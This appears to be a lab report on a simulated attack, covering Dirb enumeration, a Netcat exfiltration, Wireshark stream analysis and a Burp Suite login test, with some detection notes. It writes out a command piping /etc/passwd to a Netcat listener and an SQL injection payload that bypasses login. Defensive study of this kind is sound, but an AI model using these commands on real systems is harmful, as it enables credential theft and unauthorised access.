Network Traffic & Log Analysis Report
Tools: Wireshark, Dirb, Netcat  
Scenario: Analyzing a simulated brute-force and data exfiltration attack.

---

1. Directory Enumeration (Dirb)
Objective: Identify hidden administrative portals.
Command: `dirb http://10.10.10.5/ /usr/share/wordlists/dirb/common.txt`

Analysis:
The scan identified a hidden path: `http://10.10.10.5/admin_logs/`. 
Analyst Note: This generates significant "404 Not Found" noise in web server logs, which can be detected by setting a threshold alert (e.g., >50 errors per minute).

---

2. Listener & Exfiltration (Netcat)
Objective: Simulate data exfiltration from a compromised host.
Command (Attacker): `nc -lvnp 4444 > stolen_data.txt`
Command (Victim): `cat /etc/passwd | nc 10.10.10.5 4444`

Traffic Signature:
Standard Netcat connections occur over raw TCP. Unlike HTTP, they lack standard headers (User-Agent, Host), making them identifiable in deep packet inspection.

---

Packet Capture Analysis (Wireshark)
Objective: Confirm the exfiltration event.
Filter Applied: `ip.addr == 10.10.10.5 && tcp.port == 4444`

Findings (Follow TCP Stream):
> Packet 452: SYN (Attacker initiates)
> Packet 455: PSH, ACK (Data Payload)
> Payload Content: `root:x:0:0:root:/root:/bin/bash...`

Conclusion:
Clear evidence of unencrypted data exfiltration containing sensitive user credentials.

---

4. Web Manipulation (Burp Suite)
Objective: Bypass login validation.
Action: Intercepted POST request to `/login.php`.
Payload: Modified `username=admin` to `username=admin' --`.
Response: Server returned `200 OK` and length `4520` (Success), confirming SQL Injection vulnerability.
